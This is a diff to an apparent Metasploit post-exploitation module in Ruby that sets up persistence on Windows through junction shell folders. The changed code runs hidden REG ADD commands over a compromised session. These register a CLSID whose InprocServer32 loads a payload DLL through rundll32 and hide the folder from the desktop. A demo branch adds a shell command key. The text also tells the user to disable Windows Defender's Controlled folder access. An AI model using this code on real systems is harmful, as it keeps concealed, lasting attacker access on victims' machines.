@@ -192,11 +192,11 @@ def run
     # check for proper operative system (not windows 10)
     #
     if sysinfo['OS'] =~ /Windows 10/
-      print_warning("windows 10 version its protected againts this exploit.")
-      print_line("    -------------------------------------------------------")
-      print_line("    Disable 'Controlled folder access' in Windows Defender")
-      print_line("    If you wish to teste this on windows 10 version distros")
-      print_line("    -------------------------------------------------------")
+      print_line("windows 10 version its protected againts this exploit.")
+      print_line("-------------------------------------------------------")
+      print_line("Disable 'Controlled folder access' in Windows Defender")
+      print_line("If you wish to teste this on windows 10 version distros")
+      print_line("-------------------------------------------------------")
       Rex::sleep(6.0)
     end
 
@@ -274,49 +274,28 @@ def run
       Rex::sleep(1.0)
 
 
-     #
-     # List of registry keys to add to target regedit .. (rundll32.exe payload.dll,main)
-     #
-     if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
-       print_warning("Persistence mode sellected")
-       dll_exe = "rundll32.exe #{app_path},main"
-       hacks = [
-        '#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{dll_exe}\" /f',
-        '#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f',
-        '#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d \"Apartment\" /f',
-        '#{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d \"0xf090013d\" /f',
-        '#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f'
-       ]
-     else
-       #
-       # DEMO mode (user inputs)
-       #
-       print_status("Demonstration mode sellected")
-       hacks = [
-        '#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f'
-       ]
-     end
-
-
-       #
-       # loop funtion to execute a list of reg keys ..
-       #
-       session.response_timeout=120
-       hacks.each do |cmd|
-          begin
-            # execute cmd prompt in a hidden channelized windows
-            r = session.sys.process.execute("cmd.exe /R REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
-            print_line("    Hijacking : #{cmd}")
- 
-               # close client channel when done
-               while(d = r.channel.read)
-                       break if d == ""
-               end
-               r.channel.close
-               r.close
-           end
-         end
-
+#
+# List of registry keys to add to target regedit .. (rundll32.exe payload.dll,main)
+#
+if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
+  print_warning("Persistence mode sellected")
+  dll_exe = "rundll32.exe #{app_path},main"
+  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{dll_exe}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
+  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f", nil, {'Hidden' => true, 'Channelized' => true})
+  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d \"Apartment\" /f", nil, {'Hidden' => true, 'Channelized' => true})
+  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d \"0xf090013d\" /f", nil, {'Hidden' => true, 'Channelized' => true})
+  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f", nil, {'Hidden' => true, 'Channelized' => true})
+  r.channel.close
+  r.close
+else
+  #
+  # DEMO mode (user inputs)
+  #
+  print_status("Demonstration mode sellected")
+  r = session.sys.process.execute("cmd.exe /c REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
+  r.channel.close
+  r.close
+end
 
          #
          # build POC folder (junction shell folders)
@@ -343,37 +322,39 @@ def run
          #
          print_status("Writing cleaner resource file ..")
          Rex::sleep(1.0)
-           loot_folder = database['LOOT_FOLDER']
-           File.open("#{loot_folder}/Junction_cleaner.rc", "w") do |f|
-           f.write("reg delete \"#{hive_key}\\#{new_GUID}\" /f")
+           rand = Rex::Text.rand_text_alpha(8)
+           loot_folder = datastore['LOOT_FOLDER']
+           File.open("#{loot_folder}/#{rand}.rc", "w") do |f|
+           f.write("reg deletekey -k HKCU\\\\Software\\\\Classes\\\\CLSID\\\\#{new_GUID}")
            f.close
          end
+
+
 
 
        #
        # exploit finished (print info on screen)..
        #
-       print_good("Module execution finished ..")
        Rex::sleep(1.0)
        if datastore['PERSIST_EXPLORER'] == true
-         print_line("    -------------------------------------------------------")
-         print_line("    Trigger exploit: #{folder_poc}")
+         print_line("---------------------------------------------------")
+         print_line("Trigger exploit: #{folder_poc}")
          print_line("")
-         print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
-         print_line("    -------------------------------------------------------")
+         print_line("Resource file  : #{loot_folder}/#{rand}.rc")
+         print_line("---------------------------------------------------")
        elsif datastore['RENAME_PERSIST'] == true
-         print_line("    -------------------------------------------------------")
-         print_line("    Trigger exploit: #{ren_per}")
+         print_line("---------------------------------------------------")
+         print_line("Trigger exploit: #{ren_per}")
          print_line("")
-         print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
-         print_line("    Rename folder  : cmd.exe /c rename #{ren_per}.{new_GUID} #{ren_per}")
-         print_line("    -------------------------------------------------------")
+         print_line("Resource file  : #{loot_folder}/#{rand}.rc")
+         print_line("Rename folder  : cmd.exe /c rename #{ren_per}.{new_GUID} #{ren_per}")
+         print_line("---------------------------------------------------")
        else
-         print_line("    -------------------------------------------------------")
-         print_line("    Trigger exploit: #{fol_path}")
+         print_line("---------------------------------------------------")
+         print_line("Trigger exploit: #{fol_path}")
          print_line("")
-         print_line("    Resource file  : #{loot_folder}/Junction_cleaner.rc")
-         print_line("    -------------------------------------------------------")
+         print_line("Resource file  : #{loot_folder}/#{rand}.rc")
+         print_line("---------------------------------------------------")
        end
 
 
